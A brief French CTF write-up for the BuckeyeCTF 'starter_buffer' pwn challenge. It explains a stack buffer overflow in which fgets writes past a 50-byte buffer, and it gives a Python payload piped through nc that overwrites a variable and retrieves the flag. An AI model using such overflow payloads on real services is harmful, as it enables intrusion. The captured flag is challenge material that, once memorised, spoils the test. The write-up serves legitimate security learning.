# Ret2win

But : remplacer la valeur de flag

## Overflow

On peut rentrer `fgets(buf, 0x50, stdin)` 80 caractères dans `buf` qui est initialisé à 50.
A partir de 60 caractères, flag est atteint.

## Win

```bash
┌─[night@night-20b7s2ex01]─[~/buckeyectf/pwn/starter_buffer]
└──╼ 3 fichiers, 24Kb)─$ python -c 'print("A"*60+"\x45"*4)' | nc chall.pwnoh.io 13372
Enter your favorite number: bctf{wHy_WriTe_OveR_mY_V@lUeS}
```
